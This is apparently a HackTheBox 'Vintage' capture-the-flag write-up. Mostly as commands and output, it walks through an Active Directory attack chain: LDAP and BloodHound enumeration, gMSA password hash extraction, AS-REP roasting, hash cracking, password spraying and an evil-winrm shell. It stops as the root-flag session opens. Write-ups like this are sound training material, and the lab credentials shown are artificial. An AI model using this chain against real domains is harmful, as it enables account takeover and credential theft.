---
title: Vintage HackTheBox
date: 2025-02-13 21:00:00 +0700
layout: post
categories:
  - Hack The Box
tags:
  - writeups
  - ctf
  - hard
  - hackthebox
  - windows
image: 
    path: /assets/img/sample/vintage/vintage.jpeg
    alt: EscapeTwo Machine HackTheBox
---

## Enumeration

As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123

### Scan With Nmap

~~~ shell

┌──(trit㉿chimp)-[~/HackTheBox/Vintage]
└─$ nmap -A -sC -sV -p- 10.10.11.45
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 08:28 EST
Nmap scan report for 10.10.11.45
Host is up (0.067s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-13 13:29:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
58375/tcp open  msrpc         Microsoft Windows RPC
60857/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-13T13:30:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -16m55s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   80.21 ms 10.10.14.1
2   87.44 ms 10.10.11.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1126.28 seconds
~~~

~~~ shell
echo "10.10.11.45 vintage.htb dc01.vintage.htb" | sudo tee -a /etc/hosts
~~~

###  LDAP (Lightweight Directory Access Protocol)

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Vintage]
└─$  ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf

# extended LDIF
#
# LDAPv3
# base <DC=vintage,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName memberOf 
#

# Administrator, Users, vintage.htb
dn: CN=Administrator,CN=Users,DC=vintage,DC=htb
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=vintage,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Administrator

# Guest, Users, vintage.htb
dn: CN=Guest,CN=Users,DC=vintage,DC=htb
memberOf: CN=Guests,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: Guest

# DC01, Domain Controllers, vintage.htb
dn: CN=DC01,OU=Domain Controllers,DC=vintage,DC=htb
sAMAccountName: DC01$

# krbtgt, Users, vintage.htb
dn: CN=krbtgt,CN=Users,DC=vintage,DC=htb
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=vintage,DC=htb
sAMAccountName: krbtgt

# gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
sAMAccountName: gMSA01$

# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$

# M.Rossi, Users, vintage.htb
dn: CN=M.Rossi,CN=Users,DC=vintage,DC=htb
sAMAccountName: M.Rossi

# R.Verdi, Users, vintage.htb
dn: CN=R.Verdi,CN=Users,DC=vintage,DC=htb
sAMAccountName: R.Verdi

# L.Bianchi, Users, vintage.htb
dn: CN=L.Bianchi,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: L.Bianchi

# G.Viola, Users, vintage.htb
dn: CN=G.Viola,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: G.Viola

# C.Neri, Users, vintage.htb
dn: CN=C.Neri,CN=Users,DC=vintage,DC=htb
memberOf: CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri

# P.Rosa, Users, vintage.htb
dn: CN=P.Rosa,CN=Users,DC=vintage,DC=htb
sAMAccountName: P.Rosa

# svc_sql, Pre-Migration, vintage.htb
dn: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_sql

# svc_ldap, Pre-Migration, vintage.htb
dn: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ldap

# svc_ark, Pre-Migration, vintage.htb
dn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ark

# C.Neri_adm, Users, vintage.htb
dn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: C.Neri_adm

# L.Bianchi_adm, Users, vintage.htb
dn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb
memberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb
sAMAccountName: L.Bianchi_adm

# search reference
ref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb

# search reference
ref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 21
# numEntries: 17
# numReferences: 3

~~~
- x stands for simple authentication (without SASL).
- h specifies hostname.
- D defines bind Distinguish name. In other words, your authentication user from slapd.conf file.
- W will prompt for bind password (the one you've typed after slappasswd command).
- Base DN (Distinguished Name) of LDAP.
- LDAP filter: find users only.
- Get only the sAMAccountName and memberOf properties of each user.

Notice this line:
~~~ 
# fs01, Computers, vintage.htb
dn: CN=fs01,CN=Computers,DC=vintage,DC=htb
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb
sAMAccountName: FS01$
~~~

So we need add **fs01.vitage.htb** into `/etc/hosts` file.

> If you are getting "Clock skew too great" error because there is a time difference between the attacker machine and the target machine. Following the step to fix it.
{: .prompt-warning }

- If you are not currently running as the root user, switch to the root user by running the `sudo su` command.
- Run `timedatectl set-ntp off` to disable the Network Time Protocol from auto-updating.
- Run `rdate -n $IP` to match your date and time with the date and time of the your target machine.

~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Vintage]
└─$ sudo su                      
[sudo] password for trit: 
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# timedatectl set-ntp off
                                                                                                                                      
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# rdate -n 10.10.11.45
Thu Feb 13 09:02:45 EST 2025
~~~

## Active Directory Exploit

Using the `bloodhound-python` tool to collect data from Active Directory. Some file generated so use bloodhound GUI open them.

~~~ shell

┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodhound-python -u P.Rosa -p 'Rosaisbest123' -d vintage.htb -c All -ns 10.10.11.45
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The resolution lifetime expired after 3.103 seconds: Server Do53:10.10.11.45@53 answered The DNS operation timed out.
INFO: Done in 00M 15S

~~~




**L.BIANCHI_ADM@VINTAGE.HTB** memberOf **DOMAIN ADMIN@vintage.htb** -> pemission admin.


![](/assets/img/sample/vintage/in_domain.png)


notice # gMSA01, Managed Service Accounts, vintage.htb
dn: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
sAMAccountName: **gMSA01$** above so try find gMSA01 in bloodhound, and found user **GMSA01$@VINTAGE**.HTB, user has pemisson AddSeff into **SERVICE MANAGEMENT@vintage.htb**

![](/assets/img/sample/vintage/GMSA01.png)

**FS01** member of **DOMAIN COMPUTER@vintage**, this groups has pemission ReadGMSAPassword.


![](/assets/img/sample/vintage/FS01.png)


> If you are getting "Clock skew too great" error because there is a time difference between the attacker machine and the target machine. Following the step to fix it.
{: .prompt-warning }

- If you are not currently running as the root user, switch to the root user by running the `sudo su` command.
- Run `timedatectl set-ntp off` to disable the Network Time Protocol from auto-updating.
- Run `rdate -n $IP` to match your date and time with the date and time of the your target machine.


~~~ shell
┌──(trit㉿chimp)-[~/HackTheBox/Vintage]
└─$ sudo su
[sudo] password for trit: 
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# timedatectl set-ntp off
                                                                                                               
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# ntpdate dc01.vintage.htb
2025-02-13 21:46:17.031918 (-0500) -1016.824290 +/- 0.021487 dc01.vintage.htb 10.10.11.45 s1 no-leap
CLOCK: time stepped by -1016.824290
~~~
Use impacket-getTGR: provide password, hash or aeskey to request TGT and save it in ccache format.

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in FS01$.ccache
~~~
Set the environment variable FS01\$.ccache to specify the cache file that the Kerberos client should use.

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# export KRB5CCNAME=FS01\$.ccache

~~~

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7
msDS-ManagedPassword.B64ENCODED: G37YR+Xo7NkIU4nkCJrl8cWrcPKAzCKH7UZW+eHVzKQ+Ot45XZFdv2KMUOSLUf6AVA57yBkDSRoDf/ItCOPL9BbrKex2E54WOk5Qov+ORM/Cvou23tZdNvvZMXLelTihuYtq/Lj2Pjr+9W1Oe1NOyNfytvcbMVk1czTOurzxsH3IRgDKJ8wVhijXMx79dqrug7RVOlhwcvxPbcYoYKoXmNGIWdgbIRfNTQ6QjKNfypvGh3AOtK3ETIq07AKPM4Qnuu2IRDWyAveGp1KU3nS4t+HP5XEdkqj22/AuqAOkhXXdU7PkVeK92wR/6LUuXiFoYqnZz527rHvfx/zKiHHdjA==
~~~

Use impacket-getTGR: provide password, hash or aeskey to request TGT and save it in ccache format.
~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in GMSA01$.ccache
~~~



Set the environment variable GMSA01\$.ccache to specify the cache file that the Kerberos client should use.


~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─#  export KRB5CCNAME=GMSA01$.ccache
~~~

Then add **P.ROSA** into **SERVICEMANAGERS**

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" P.ROSA
[+] P.ROSA added to SERVICEMANAGERS

┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in P.Rosa.ccache

Add rosa vao bien moi truong

┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# export KRB5CCNAME=P.Rosa.ccache 
~~~


Create a list of domain usernames to list users who do not need Kerberos domain authentication.


~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | cut -d " " -f 2 > usernames.txt
                                                                  
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# ls
 20250213090332_computers.json    20250213090332_users.json
 20250213090332_containers.json  'FS01$.ccache'
 20250213090332_domains.json     'GMSA01$.ccache'
 20250213090332_gpos.json         GMSA01.ccache
 20250213090332_groups.json       usernames.txt
 20250213090332_ous.json
                                                                  
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# cat usernames.txt 
Administrator
Guest
DC01$
krbtgt
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
~~~

Then use impact-GetNPUsers to list users that do not require Kerberos domain authentication


~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User svc_ldap doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_ark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
~~~

Disable user authentication: svc_ark, svc_ldap, svc_sql -> This allows you to do AS-REP Roasting to get the account hash without the password -> this hash can be cracked to get the real password!

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k   add uac svc_ark -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_ark's userAccountControl
                                                                                                               
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_ldap  -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_ldap's userAccountControl
                                                                                                               
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k add uac svc_sql  -f DONT_REQ_PREAUTH
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_sql's userAccountControl

~~~


Remove the ACCOUNTDISABLE flag from the svc_ark, svc_ldap, svc_sql accounts
If the svc_ark account is disabled (you won't be able to request AS-REP hashes), this command will re-enable the account, allowing you to continue mining.

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac svc_ldap -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from svc_ldap's userAccountControl
                                                                                                               
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac svc_sql -f ACCOUNTDISABLE 

[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
                                                                                                               
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# bloodyAD --host dc01.vintage.htb -d vintage.htb --dc-ip 10.10.11.45 -k remove uac svc_ark -f ACCOUNTDISABLE 

[-] ['ACCOUNTDISABLE'] property flags removed from svc_ark's userAccountControl
~~~



Recheck users in domain.

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─#  impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc_sql@VINTAGE.HTB:962167a561a95af0edf061a7987f6cea$6ac087d49c6f5728c67e26e9b8882d44f116491489d6b5b1e22dd7aa06387c125bb02df3839fe4edfb358dda2ad503266adcd4b888645d2164b327304c58a397e686910c374caaf1fa176e037c077d07652eaaa2399556d3401c2a44b37e9cad7f95a474235c8e9bc5b93a49ef92159858d099d9f2389d97cd89c7354fc61a9141f8d63d6b179a260dd24c1b55100523ba5f4dda3075694440dfff1f566d067232a20bb1564516911afa4ef59d4c8c62871b43bb823f74ba124fffb0d53105de2a74b946510b017f5481125b7ee70366a760c71a513ec9d5fe65c57e3608affd837ea0898ac6770ecae3
$krb5asrep$23$svc_ldap@VINTAGE.HTB:8589e491c8c750b814c42aa71d1ade48$89f17e62251ad2178ba8ab03b694e8e063472a7eb71f94d9d1febbbad28c0e3db89dfb29aa090106eb0abd2eff202be19a0f8020d1ac2d1bbd6aaa55a6e30d8fdd4dd423941f77deeb8b592d60f6b94cf733fcc87653c94ae0abcdeb41136ddf019f52f14a9a0069fd6140d75ada285218fbaee775380e8306ddf99aa3691a7e908b62866ebac9723b37dd558eee1e5e2051edc01f52a2c2e62ea61375d06b2a7676951d2b9c39e66009586a589d11486b279ef2e2e5575221a55efa317f50c02e45b1b7d18698ae9c6fc7624b57abf82ffb5d846eb8d686f79eba93b11129c0588d7c9dca4b9199a700
$krb5asrep$23$svc_ark@VINTAGE.HTB:2a57631857f79b9e8fab2b26509c6327$81e8036ce20f2a32faffc6466eba22b0cdff09289fa0a0d297e9b248c0473c378d615776065ef15e1693f54e3474950d997a93b79ff8eafe7e78136baa4b67fd8e1227e71ec607cfbb58b41481c9610484601048750b3648620c6064f96ce4e4a0fa770d3e732be8f2a0deb2fb78c04259d90fcf3e0b68f21f531ca46be6aa6a5843511fc38254750d90c6c05bd897304ab642d3effe789e434676e957739398abbb32f566a9debf784fe053df40870f674ff25a3721e8f553ba428b175668cc64b0ce8557d14be83566cbef345466ee3eddb6df2ef2b7c1be4e33d136f6f788939b3eea9dcc2c61f632
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
~~~

## Crack Password

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# cat password_hash.txt 
$krb5asrep$23$svc_sql@VINTAGE.HTB:962167a561a95af0edf061a7987f6cea$6ac087d49c6f5728c67e26e9b8882d44f116491489d6b5b1e22dd7aa06387c125bb02df3839fe4edfb358dda2ad503266adcd4b888645d2164b327304c58a397e686910c374caaf1fa176e037c077d07652eaaa2399556d3401c2a44b37e9cad7f95a474235c8e9bc5b93a49ef92159858d099d9f2389d97cd89c7354fc61a9141f8d63d6b179a260dd24c1b55100523ba5f4dda3075694440dfff1f566d067232a20bb1564516911afa4ef59d4c8c62871b43bb823f74ba124fffb0d53105de2a74b946510b017f5481125b7ee70366a760c71a513ec9d5fe65c57e3608affd837ea0898ac6770ecae3
~~~

I found type hash in [this site](https://nth.skerritt.blog/).

>Because there are many special characters, it is not recommended to use `echo`, use editing tools such as `vim`, `nano`.
{: .prompt-tip}

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# john password_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Zer0the0ne       ($krb5asrep$23$svc_sql@VINTAGE.HTB)     
1g 0:00:00:01 DONE (2025-02-13 22:54) 0.5917g/s 614400p/s 614400c/s 614400C/s abc$$$123..Zer0the0ne
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~


I dowload `kerbrute_linux_amd64` in [this site](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3). This is useful for testing one or two common passwords when you have a large list of users. 

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# chmod +x kerbrute_linux_amd64 
                                                                                                               
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# ./kerbrute_linux_amd64 --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/13/25 - Ronnie Flathers @ropnop

2025/02/13 23:05:06 >  Using KDC(s):
2025/02/13 23:05:06 >  	vintage.htb:88

2025/02/13 23:05:07 >  [!] Guest@vintage.htb:Zer0the0ne - USER LOCKED OUT
2025/02/13 23:05:07 >  [!] krbtgt@vintage.htb:Zer0the0ne - USER LOCKED OUT
2025/02/13 23:05:07 >  [!] G.Viola@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] DC01$@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] L.Bianchi@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] M.Rossi@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] Administrator@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] R.Verdi@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] FS01$@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] gMSA01$@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] svc_sql@vintage.htb:Zer0the0ne - USER LOCKED OUT
2025/02/13 23:05:07 >  [!] P.Rosa@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] C.Neri_adm@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] L.Bianchi_adm@vintage.htb:Zer0the0ne - Invalid password
2025/02/13 23:05:07 >  [!] svc_ldap@vintage.htb:Zer0the0ne - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/02/13 23:05:07 >  [!] svc_ark@vintage.htb:Zer0the0ne - Got AS-REP (no pre-auth) but couldn't decrypt - bad password
2025/02/13 23:05:07 >  [+] VALID LOGIN:	 C.Neri@vintage.htb:Zer0the0ne
2025/02/13 23:05:07 >  Done! Tested 17 logins (1 successes) in 0.249 seconds
~~~

We have a credential: **C.Neri@vintage.htb:Zer0the0ne**

Get ticket and sets the environment variable KRB5CCNAME, which is used by Kerberos to specify the location of the credential cache (ccache) file that stores authentication tickets.

~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in c.neri.ccache
                                                                                                  
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# export KRB5CCNAME=c.neri.ccache     
~~~

Then login remotely to port 5985.

~~~
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# evil-winrm -i dc01.vintage.htb -u C.Neri -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> cat user.txt
4a34ff923f9258178fff27f85790****
*Evil-WinRM* PS C:\Users\C.Neri\Desktop
~~~
## Get Root Flag
~~~ shell
┌──(root㉿chimp)-[/home/trit/HackTheBox/Vintage]
└─# evil-winrm -i dc01.vintage.htb -u C.Neri -r vintage.htb       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
